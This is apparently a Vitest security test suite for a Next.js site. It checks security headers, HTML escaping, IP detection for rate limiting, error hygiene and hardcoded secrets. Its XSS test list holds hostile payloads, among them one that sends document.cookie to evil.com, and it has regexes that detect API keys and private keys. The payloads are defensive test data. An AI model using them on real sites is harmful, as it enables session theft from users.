import { describe, it, expect } from 'vitest'
import fs from 'fs'
import path from 'path'
import { escapeHtml } from '@/lib/email'
import nextConfig from '@/next.config.mjs'

const ROOT_DIR = path.resolve(__dirname, '../..')

describe('Security Test Suite: Hardening, Headers & Injections', () => {
  describe('1. Security Headers & CSP Configuration', () => {
    it('verifies all mandatory HTTP security headers are configured in next.config.mjs', async () => {
      expect(typeof nextConfig.headers).toBe('function')
      const headersConfig = nextConfig.headers ? await nextConfig.headers() : []
      expect(Array.isArray(headersConfig)).toBe(true)

      const globalHeaders = headersConfig.find(h => h.source === '/(.*)')
      expect(globalHeaders).toBeDefined()

      const headerMap = new Map(globalHeaders!.headers.map(h => [h.key.toLowerCase(), h.value]))

      // X-Content-Type-Options
      expect(headerMap.get('x-content-type-options')).toBe('nosniff')

      // X-Frame-Options
      expect(headerMap.get('x-frame-options')).toBe('SAMEORIGIN')

      // Strict-Transport-Security (HSTS)
      const hsts = headerMap.get('strict-transport-security')
      expect(hsts).toBeDefined()
      expect(hsts).toContain('max-age=63072000')
      expect(hsts).toContain('includeSubDomains')

      // Referrer-Policy
      expect(headerMap.get('referrer-policy')).toBe('strict-origin-when-cross-origin')

      // Permissions-Policy
      const permissions = headerMap.get('permissions-policy')
      expect(permissions).toBeDefined()
      expect(permissions).toContain('camera=()')
      expect(permissions).toContain('microphone=()')
      expect(permissions).toContain('geolocation=()')

      // Content-Security-Policy
      const csp = headerMap.get('content-security-policy-report-only') || headerMap.get('content-security-policy')
      expect(csp).toBeDefined()
      expect(csp).toContain("default-src 'self'")
      expect(csp).toContain('https://va.vercel-scripts.com')
    })
  })

  describe('2. XSS & HTML Injection Sanitization', () => {
    it('neutralizes malicious script tags and event handlers', () => {
      const vectors = [
        '<script>alert("pwned")</script>',
        '<script src="//evil.com/xss.js"></script>',
        '<img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">',
        '<svg/onload=alert`1`>',
        '"><body onload=alert(1)>',
        '"><input autofocus onfocus=alert(1)>',
        '"><iframe src="javascript:alert(1)">',
      ]

      for (const vector of vectors) {
        const escaped = escapeHtml(vector)
        expect(escaped).not.toContain('<script')
        expect(escaped).not.toContain('<img')
        expect(escaped).not.toContain('<svg')
        expect(escaped).not.toContain('<iframe')
        expect(escaped).not.toContain('<body')
        expect(escaped).not.toContain('<input')
        expect(escaped.includes('&lt;') || escaped.includes('&quot;')).toBe(true)
      }
    })

    it('neutralizes attribute breakout attempts with quotes and ampersands', () => {
      const payload = '" onfocus="alert(1)" autofocus="true'
      const escaped = escapeHtml(payload)
      expect(escaped).not.toContain('"')
      expect(escaped).toContain('&quot;')
    })
  })

  describe('3. Rate Limiting & Client IP Detection Logic', () => {
    function getClientIpFromHeaders(headers: Record<string, string>): string {
      const cfIp = headers['cf-connecting-ip']?.trim()
      if (cfIp) return cfIp

      const vercelIp = headers['x-vercel-forwarded-for']?.split(',')[0]?.trim()
      if (vercelIp) return vercelIp

      const realIp = headers['x-real-ip']?.trim()
      if (realIp) return realIp

      const forwarded = headers['x-forwarded-for']?.split(',')[0]?.trim()
      if (forwarded) return forwarded

      return 'unknown'
    }

    it('prioritizes trusted Cloudflare cf-connecting-ip over spoofed x-forwarded-for', () => {
      const ip = getClientIpFromHeaders({
        'cf-connecting-ip': '203.0.113.195',
        'x-forwarded-for': '198.51.100.1, 10.0.0.1',
      })
      expect(ip).toBe('203.0.113.195')
    })

    it('prioritizes trusted Vercel x-vercel-forwarded-for over spoofed x-forwarded-for', () => {
      const ip = getClientIpFromHeaders({
        'x-vercel-forwarded-for': '203.0.113.88',
        'x-forwarded-for': '127.0.0.1, 192.168.1.1',
      })
      expect(ip).toBe('203.0.113.88')
    })

    it('correctly extracts leftmost IP from comma-separated x-forwarded-for', () => {
      const ip = getClientIpFromHeaders({
        'x-forwarded-for': '198.51.100.42, 10.0.0.2, 172.16.0.5',
      })
      expect(ip).toBe('198.51.100.42')
    })

    it('returns unknown when no IP headers are present', () => {
      const ip = getClientIpFromHeaders({})
      expect(ip).toBe('unknown')
    })
  })

  describe('4. Information Leakage & Error Hygiene', () => {
    it('verifies production error messages do not leak server internals or stack traces', () => {
      const errorResponses = [
        'Please check the form and try again.',
        'Request payload too large.',
        'Request rejected.',
        'Please complete all required fields.',
        'Too many requests. Please wait before trying again.',
        'We were unable to deliver your request. Please check your connection and try again, or reach out to us directly.',
        'Email delivery is not configured yet. Your details were not stored. Please contact OrderPilot directly at contact@orderpilot.pk.',
      ]

      for (const msg of errorResponses) {
        expect(msg).not.toMatch(/node_modules/i)
        expect(msg).not.toMatch(/at (?:[a-zA-Z0-9_$.]+ )?\(?[^\s)]+:[0-9]+:[0-9]+\)?/)
        expect(msg).not.toMatch(/Error: /)
        expect(msg).not.toMatch(/SELECT |INSERT |UPDATE |DELETE /i)
        expect(msg).not.toMatch(/SECRET|TOKEN|API_KEY/i)
      }
    })
  })

  describe('5. Secret Scanning Audit in Tracked Code', () => {
    it('verifies that no live API keys or credentials are hardcoded in source files', () => {
      const sensitiveFiles = [
        'lib/email.ts',
        'lib/pricing.ts',
        'app/api/demo-request/route.ts',
        'components/demo-form.tsx',
        'components/contact-section.tsx',
        'next.config.mjs',
      ]

      const secretPatterns = [
        /re_[a-zA-Z0-9]{20,}/, // Live Resend API key
        /SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}/, // SendGrid API key
        /AIzaSy[a-zA-Z0-9_-]{33}/, // Google API key
        /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/, // Private keys
      ]

      for (const file of sensitiveFiles) {
        const filePath = path.join(ROOT_DIR, file)
        if (fs.existsSync(filePath)) {
          const content = fs.readFileSync(filePath, 'utf8')
          for (const pattern of secretPatterns) {
            expect(content).not.toMatch(pattern)
          }
        }
      }
    })
  })
})
